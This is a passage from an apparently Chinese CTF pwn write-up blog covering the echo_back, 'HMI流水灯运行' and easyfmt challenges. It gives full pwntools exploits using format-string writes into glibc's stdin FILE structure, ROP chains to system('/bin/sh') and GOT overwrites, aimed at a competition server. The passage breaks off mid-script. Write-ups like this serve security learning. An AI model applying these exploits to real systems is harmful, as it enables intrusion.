<h4 id="思路及利用-21"><a href="#思路及利用-21" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>整个程序就只有一个格式化字符串漏洞，但是对输入进行了限制无论是setname还是echo back都只能输入7字符，构造的payload无论如何都是比7大的。所以需要新的知识。</p>
<p>利用printf漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处输入数据.</p>
<p>scanf是从stdin中读取数据的，如果我们能够修改它，就能实现任意内存写入。而stdin是一个FILE (_IO_FILE) 结构体指针。</p>
<p>结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic </span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments. </span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> _fileno;  </span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>

<p>再看scanf（省略很多）的实现，可以知道scanf函数主要通过调用<code>__vfscanf_internal</code>函数，从标准输入<code>stdin</code>读取数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __isoc99_scanf (<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  done = __vfscanf_internal(<span class="built_in">stdin</span>, format, arg, SCANF_ISOC99_A);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在调用的过程中会做一些检查，其中关键的是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123; </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 判断fp的当前读取的位置是否超出了读取缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="comment">// 返回fp的_IO_read_ptr作为用于写数据的位置</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对fp进行赋值操作，统一为_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向_IO_buf_base写入数据，长度是_IO_buf_end - _IO_buf_base</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要是我们能够修改_IO_buf_base和_IO_buf_end 那么我们就可以实现任意位置无限制长度的写数据。</p>
<p>我们首先需要定位到*<strong>*_IO_2_1_stdin_**</strong>结构体在内存中的位置，然后再定位到*<strong>*_IO_buf_base**</strong> 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7</p>
<p>首先查找_IO_buf_base的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109171752812.png" alt="image-20210109171752812"></p>
<p>可以得到<code>_IO_buf_base</code>和<code>_IO_buf_end</code>分别位于<code>_IO_2_1_stdin_</code>结构体的第8和第9位。其中<code>_IO_buf_base</code>的值为0x7ffff7dcda83是<code>_IO_2_1_stdin_+0x83</code>，可得<code>_IO_2_1_stdin</code>的地址是0x7ffff7dcda00。若将<code>_IO_buf_base</code>的最低字节覆盖为0，变成0x7ffff7dcda80，即为<code>_IO_2_1_stdin_+0x20</code>，即是<code>_IO_write_base</code>的地址。<br>利用printf的格式化字符串攻击就可以将0写入到<code>_IO_buf_base</code>的最低字节，从而可以利用scanf的IO漏洞进一步覆盖<code>_IO_buf_base</code>和<code>_IO_buf_end</code>从而向任意内存位置写入任意数据。</p>
<p>因此思路为：</p>
<ol>
<li>格式化字符串获得libc的基地址main函数的返回地址</li>
<li>利用格式化字符串把_IO_buf_base的最低一个byte置为\x00</li>
<li> 把IO_write_base,IO_write_ptr和IO_write_end的值写回去（IO_2_1_stdin+0x83），然后 把IO_buf_base和_IO_buf_end覆盖为main的返回地址和main的返回地址+0x18</li>
<li>使用scanf写入ROP</li>
</ol>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">   </span><br><span class="line">libcpath = <span class="string">&#x27;./libc.so.6&#x27;</span>  </span><br><span class="line">sh = process(<span class="string">&#x27;./echo_back&#x27;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&#x27;220.249.52.134&#x27;,36599)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo_back&#x27;</span>)  </span><br><span class="line">libc = ELF(libcpath)  </span><br><span class="line"><span class="comment">#main在elf中的静态地址  </span></span><br><span class="line">main_s_addr = <span class="number">0xC6C</span>  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line"><span class="comment">#在elf中的静态地址  </span></span><br><span class="line">pop_s_rdi = <span class="number">0xD93</span>  </span><br><span class="line">   </span><br><span class="line">_IO_2_1_stdin_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echoback</span>(<span class="params">content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)  </span><br><span class="line">   sh.send(content)  </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,name)  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%19$p&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露__libc_start_main的地址  </span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0xF0</span>  </span><br><span class="line"><span class="comment">#得到libc加载的基地址  </span></span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  </span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span>  </span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;iobase=&#x27;</span>,<span class="built_in">hex</span>(_IO_buf_base)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#泄露main的地址  </span></span><br><span class="line">echoback(<span class="string">&#x27;%13$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0x9C</span>  </span><br><span class="line">elf_base = main_addr - main_s_addr  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf base=&#x27;</span>,<span class="built_in">hex</span>(pop_rdi)  </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%12$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露main的ebp的值  </span></span><br><span class="line">main_ebp = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#泄露存放(main返回地址)的地址  </span></span><br><span class="line">main_ret = main_ebp + <span class="number">0x8</span>  </span><br><span class="line">   </span><br><span class="line">setName(p64(_IO_buf_base))  </span><br><span class="line"><span class="comment">#覆盖_IO_buf_base的低1字节为0  </span></span><br><span class="line">echoback(<span class="string">&#x27;%16$hhn&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#修改_IO_2_1_stdin_结构体  </span></span><br><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#不断调用getchar()使fp-&gt;_IO_read_ptr与使fp-&gt;_IO_read_end相等  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)<span class="number">-1</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#对目标写入ROP  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line"><span class="comment">#这个换行最好单独发送  </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<h3 id="28-HMI流水灯运行"><a href="#28-HMI流水灯运行" class="headerlink" title="28. HMI流水灯运行"></a>28. HMI流水灯运行</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173418628.png" alt="image-20210109173418628"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173447352.png" alt="image-20210109173447352"></p>
<h4 id="代码分析-23"><a href="#代码分析-23" class="headerlink" title="代码分析"></a>代码分析</h4><p>发现一个栈溢出</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173726167.png" alt="image-20210109173726167"></p>
<p>可以看出来在 i 等于 2 时，会将 SIGALRM 信号设置为 handler 函数(一个关于这两个 for 函数的死循环)</p>
<p>然后设置 alarm(2u) 使得 2 秒后程序接收到 SIGALRM 信号，然后执行 handler 函数的内容</p>
<p>但是在这 2 秒内，程序已经运行到了底下的 gee 函数内。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173941838.png" alt="image-20210109173941838"></p>
<h4 id="思路及利用-22"><a href="#思路及利用-22" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>在 i 等于 2 时，如果利用 rop 把 alarm 的秒数改为 0，就可以取消掉 alarm。然后就是基础的rop操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>, <span class="number">32685</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc_32.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./format&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">plt_alarm = elf.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">addr_main = <span class="number">0x80488AD</span></span><br><span class="line">addr_ebp_ret = <span class="number">0x08048bbb</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 1 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 2 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 3 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x1b\x5b\x31\x41\x1b\x5b\x4b\x0a\x0a&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 4 finished&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8c</span></span><br><span class="line">payload += p32(plt_alarm)</span><br><span class="line">payload += p32(addr_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(plt_puts)</span><br><span class="line">payload += p32(addr_main)</span><br><span class="line">payload += p32(got_puts)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">addr_puts = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = addr_puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;addr_puts   = &#x27;</span> + <span class="built_in">hex</span>(addr_puts))</span><br><span class="line">success(<span class="string">&#x27;addr_system = &#x27;</span> + <span class="built_in">hex</span>(addr_system))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 1 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 2 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 3 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x1b\x5b\x31\x41\x1b\x5b\x4b\x0a\x0a&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 4 finished&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8c</span></span><br><span class="line">payload += p32(plt_alarm)</span><br><span class="line">payload += p32(addr_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(addr_system)</span><br><span class="line">payload += p32(addr_main)</span><br><span class="line">payload += p32(addr_bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109174633572.png" alt="image-20210109174633572"></p>
<h3 id="29-easyfmt"><a href="#29-easyfmt" class="headerlink" title="29. easyfmt"></a>29. easyfmt</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109175124057.png" alt="image-20210109175124057"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109175145182.png" alt="image-20210109175145182"></p>
<h4 id="代码分析-24"><a href="#代码分析-24" class="headerlink" title="代码分析"></a>代码分析</h4><p>显然存在格式化字符串漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109180726021.png" alt="image-20210109180726021"></p>
<p>但是由于有exit函数存在，格式化字符串只能使用一次。</p>
<p>程序的开始还有一个checkin函数，需要猜对这个数才行。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181044048.png" alt="image-20210109181044048"></p>
<h4 id="思路及利用-23"><a href="#思路及利用-23" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>题目没有后门函数，所以至少需要两次使用格式化字符串，一次泄露一次修改。</p>
<p>所以第一次，先将exit的plt修改为main地址，这样就可以重复利用格式化字符串漏洞。</p>
<p>对于checkin函数，是一个一位的数，我们直接固定一个不断重复就行。十分之一的概率并不低。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = process(&#x27;./easy_fmt&#x27;)  </span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">40242</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyfmt&#x27;</span>)  </span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  </span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;enter:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#修改exit的got表，指向main+0x7C处，即形成一个循环，这样我们能继续使用printf  </span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="string">b&#x27;2434&#x27;</span> + <span class="string">b&#x27;c%10$hn&#x27;</span>  </span><br><span class="line">payload = payload.ljust(<span class="number">16</span>,<span class="string">b&#x27;b&#x27;</span>) + p64(exit_got)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露read地址  </span></span><br><span class="line">payload = <span class="string">b&#x27;%10$sBBB&#x27;</span> + p64(read_got)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.recv(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">read_addr = u64(sh.recvuntil(<span class="string">&#x27;BBB&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#print hex(read_addr)  </span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)  </span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment"># print &#x27;libc_base=&#x27;,hex(libc_base)  </span></span><br><span class="line"><span class="comment"># print &#x27;system_addr=&#x27;,hex(system_addr)  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#修改printf的got表，只需修改低3字节即可到system  </span></span><br><span class="line">data = system_addr &amp; <span class="number">0xFF</span> 